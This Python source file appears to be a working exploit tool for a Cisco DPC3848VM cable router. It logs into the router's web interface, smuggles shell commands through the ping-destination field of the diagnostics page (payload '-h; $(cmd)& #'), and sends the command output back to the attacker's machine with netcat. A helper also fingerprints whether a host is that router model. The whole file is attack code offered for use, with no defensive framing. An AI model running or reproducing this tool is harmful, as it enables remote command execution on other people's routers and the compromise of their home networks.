import re
from contextlib import asynccontextmanager
from typing import NamedTuple

import asks
import trio
from loguru import logger

_PHPSESSID_REGEX = re.compile("PHPSESSID=([a-z0-9]+);")


class Dpc:
    def __init__(self, host, port, nursery):
        self._host = host
        self._port = port
        self.nursery = nursery
        self._session = asks.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Origin": f"http://{self._host}",
            "X-Requested-With": "XMLHttpRequest",
            "DNT": "1",
            "Connection": "close",
            "Cookie": "err_cnt=",
            "Referer": f"http://{self._host}/Diagnostics.php",
            "Upgrade-Insecure-Requests": "0",
        }

        self._session.headers.update(headers)

        self._last_output = ""
        self._output_received = trio.Event()

    async def _cmd_output_handler(self, server_stream):
        messages = []

        try:
            async for data in server_stream:
                messages.append(data.decode("utf8"))

        except Exception as e:
            logger.error(f"cmd_output_handler crashed: {e}")

        self._last_output = "".join(messages)
        self._output_received.set()

    async def _start_cmd_output_server(self, host, port):
        self._output_received = trio.Event()
        await trio.serve_tcp(self._cmd_output_handler, port=port, host=host)

    @property
    def host(self):
        return self._host

    @property
    def port(self):
        return self._port

    @property
    def url(self):
        return f"http://{self.host}:{self.port}"

    def set_session_id(self, session_id: str):
        logger.debug(f"Loading session id: {session_id}")
        self._session.headers["cookie"] = f"PHPSESSID={session_id}; err_cnt="

    async def load_session_id(self, session_id: str):
        self.set_session_id(session_id)

        # For some reason it doesn't consider our cookie valid unless we visit this (or any?) page first.
        r = await self._session.get(f"{self.url}/Administration.php")
        if r.status_code != 200:
            raise PermissionError("GET /Administration.php failed")

        return r

    async def login(self, username="", password=""):
        r = await self._session.post(
            f"{self.url}/check.php",
            data={
                "username_login": username,
                "password_login": password,
                "LanguageSelect": "en",
                "login": "Log In",
            },
        )

        logger.debug(f"response: {r=}")
        session_id = _PHPSESSID_REGEX.findall(r.headers["set-cookie"][0])[0]
        return await self.load_session_id(session_id)

    async def send_cmd(self, cmd: str):
        # OS command injection using substitution: ping $(uname -a | nc ...)
        payload = f"-h; $({cmd})& #"
        logger.debug(f"{payload=}")
        r = await self._session.get(f"{self.url}/actionHandler/checkLogin.php")
        if r.status_code != 200:
            raise PermissionError("GET /checkLogin.php failed")

        r = await self._session.post(
            f"{self.url}/actionHandler/ajaxSet_Diagnostics.php.php",
            data={
                "ping_ip_start": "true",
                "ping_dst": payload,
                "ping_size": 56,
                "ping_count": 1,
                "ping_timeout": 1,
            },
        )

        logger.debug(f"command response: {r=}")
        if r.status_code == 401:
            raise PermissionError("Not authenticated")

    async def exec(self, cmd: str, lhost: str, lport: int) -> str:
        self.nursery.start_soon(self._start_cmd_output_server, lhost, lport)
        await self.send_cmd(f"{cmd} 2>&1 | cat | nc {lhost} {lport}")
        with trio.move_on_after(10):
            await self._output_received.wait()

        self.nursery.cancel_scope.cancel()
        if not self._output_received.is_set():
            raise TimeoutError("Timeout while waiting for command output")

        return self._last_output

    async def logout(self):
        return await self._session.get(f"{self.url}/logout.php")


@asynccontextmanager
async def open_dpc(
    host: str, port: int, username: str, password: str, session_id: str | None = None
):
    async with trio.open_nursery() as n:
        router = Dpc(host, port, n)
        try:
            if session_id is None:
                logger.info("Logging in")
                await router.login(username, password)
                logger.success("Logged in")
            else:
                router.set_session_id(session_id)
                logger.info(f"Using session id {session_id}")
            yield router

        finally:
            await router.logout()


async def check_is_router(host: str, port: int) -> bool:
    r = await asks.get(f"http://{host}:{port}/Docsis_system.php")
    return "DPC3848VM" in r.text


class ExploitConfig(NamedTuple):
    local_host: str
    local_port: int
    remote_host: str
    remote_port: int


async def run_command(
    cmd, config: ExploitConfig, username: str, password: str, session_id: str | None = None
) -> str:
    async with open_dpc(
        config.remote_host, config.remote_port, username, password, session_id=session_id
    ) as router:
        logger.info(f'Sending "{cmd}" to DPC...')
        return await router.exec(cmd, config.local_host, config.local_port)
